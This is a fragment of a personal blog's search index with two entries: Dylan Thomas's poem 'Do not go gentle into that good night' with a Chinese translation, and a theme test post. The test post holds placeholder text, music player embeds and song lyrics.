      <link href="/2017/03/22/%E6%98%9F%E9%99%85%E7%A9%BF%E8%B6%8A-%E5%B0%8F%E8%AF%97/"/>
      <url>/2017/03/22/%E6%98%9F%E9%99%85%E7%A9%BF%E8%B6%8A-%E5%B0%8F%E8%AF%97/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>Do not go gentle into that good night</strong><br>-Dylan Thomas </p><p><em>Do not go gentle into that good night,<br>Old age should burn and rave at close of day;  　　<br>Rage, rage against the dying of the light.  　　  　　<br>Though wise men at their end know dark is right,  　　<br>Because their words had forked no lightning they  　　<br>Do not go gentle into that good night.  　　  　　<br>Good men, the last wave by, crying how bright  　　<br>Their frail deeds might have danced in a green bay,  　　<br>Rage, rage against the dying of the light.  　　  　　<br>Wild men who caught and sang the sun in flight,  　　<br>And learn, too late, they grieved it on its way,  　　<br>Do not go gentle into that good night.  　　  　　<br>Grave men, near death, who see with blinding sight  　　<br>Blind eyes could blaze like meteors and be gay,  　　<br>Rage, rage against the dying of the light.  　　  　　<br>And you, my father, there on the sad height,  　　<br>Curse, bless, me now with your fierce tears.,I pray.<br>Do not go gentle into that good night,    　<br>Rage, rage against the dying of the light. </em></p><p>《不要温和地走进那个良夜》</p><p>狄兰·托马斯</p><p>不要温和地走进那个良夜，<br>老年应当在日暮时燃烧咆哮；<br>怒斥，怒斥光明的消逝。</p><p>虽然智慧的人临终时懂得黑暗有理，<br>因为他们的话没有迸发出闪电，他们<br>也并不温和地走进那个良夜。</p><p>善良的人，当最后一浪过去，高呼他们脆弱的善行<br>可能曾会多么光辉地在绿色的海湾里舞蹈，<br>怒斥，怒斥光明的消逝。</p><p>狂暴的人抓住并歌唱过翱翔的太阳，<br>懂得，但为时太晚，他们使太阳在途中悲伤，<br>也并不温和地走进那个良夜。</p><p>严肃的人，接近死亡，用炫目的视觉看出<br>失明的眼睛可以像流星一样闪耀欢欣，<br>怒斥，怒斥光明的消逝。</p><p>你啊，我的父亲。在那悲哀的高处。<br>现在用您的热泪诅咒我，祝福我吧。我求您<br>不要温和地走进那个良夜。<br>怒斥，怒斥光明的消逝。</p>]]></content>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>New test</title>
      <link href="/2016/04/25/New%20test/"/>
      <url>/2016/04/25/New%20test/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>fefefefe<br>abcd这也是一篇测试文章</p><p>[TOC]</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=26237342&auto=1&height=66"></iframe>你很好了我服了我了佛网联合<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=2441224987&auto=1&height=430"></iframe><p>假设X是一个离散随机变量，其可能的取值有：$\left\{ x<em>1 ,x_2 ,……,x</em>{n} \right\}$，各个取值对应的概率取值为：$P\left( x_k \right) , k=1,2,……,n $，则其数学期望被定义为：</p><p>$\sum=er_dew11$<br>[TOC]</p><p>$\{ x_1 ,x_2 ,……,x_n \}$<br>efefewfwefwefwefweefe<br>$P( x_k) , k=1,2,……,n $</p><script type="math/tex; mode=display">efewfw\frac{1}{trhtr7}</script><p><img src="/2016/04/25/New test/img8.jpg" alt=""></p>        <div id="aplayer-VAulNbqO" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;width:50%;">            <pre class="aplayer-lrc-content">[ti:偶像万万岁][ar:TimeZ][al:][by:苏紫晨][00:01.47]偶像万万岁[00:03.34]演唱：TimeZ[00:05.57]作词：商步芸[00:07.79]作曲：刘佳[00:09.99]编曲：MASTER KEY[00:11.62][00:13.28][00:16.06]追求完美的偶像 万万岁[00:19.16]才华洋溢的偶像 万万岁[00:22.45]十八般武艺 每一样都要学[00:25.92]会变魔术又会耍炫[00:29.44]为你而生的偶像 万万岁[00:32.70]为你平凡的偶像 万万岁[00:35.94]痛苦和悲伤 留给我自己[00:39.47]快乐送给最爱的你[00:43.21]当爱像冬天不断的飘雪[00:46.24]温柔的拥抱像炙热火焰[00:49.48]一起吹吹风看海或看天[00:52.95]让你靠我的肩[00:56.35]当孤单来袭你不用担心[00:59.74]无条件收藏流下的眼泪[01:03.05]不分日与夜像一个守卫[01:06.45]你是我的唯一宝贝[01:10.07]锻炼成偶像都是为你而准备[01:16.40]守护一辈子幸福 是我此生的心愿[01:22.08][01:25.17]追求完美的偶像 万万岁[01:28.43]才华洋溢的偶像 万万岁[01:31.67]十八般武艺 每一样都要学[01:35.24]会变魔术又会耍炫[01:38.66]为你而生的偶像 万万岁[01:41.93]为你平凡的偶像 万万岁[01:45.16]痛苦和悲伤 留给我自己[01:48.74]快乐送给最爱的你[01:52.37]大步跑操场 八百公里不喊累[01:55.71]12345 扛举重练手臂[01:58.93]梦想没实现之前 都不准说要撤退[02:02.20]困难就好像跳不完的障碍比赛[02:05.87]跌倒了再往前 为你哭为你疼[02:08.85]有烦恼让我背 这点苦算什么[02:12.30]付出是因为在乎 你是我努力的终点[02:15.64]甘愿为你奉献一切[02:19.19]锻炼成偶像都是为你而准备[02:25.68]守护一辈子幸福 是我此生的心愿[02:31.35][02:34.63]追求完美的偶像 万万岁[02:37.70]才华洋溢的偶像 万万岁[02:40.98]十八般武艺 每一样都要学[02:44.53]会变魔术又会耍炫[02:47.98]为你而生的偶像 万万岁[02:51.31]为你平凡的偶像 万万岁[02:54.54]痛苦和悲伤 留给我自己[02:58.07]快乐送给最爱的你[03:01.71]痛苦和悲伤 留给我自己[03:04.93]快乐送给最爱的你[03:08.10]</pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-VAulNbqO"),            narrow: false,            autoplay: false,            showlrc: 2,            music: {              title: "偶像万万岁",              author: "TimeZ",              url: "偶像万万岁.mp3",              pic: "/2016/04/25/New%20test/偶像万万岁.jpg",              lrc: "偶像万万岁.txt"            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> 主题测试 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
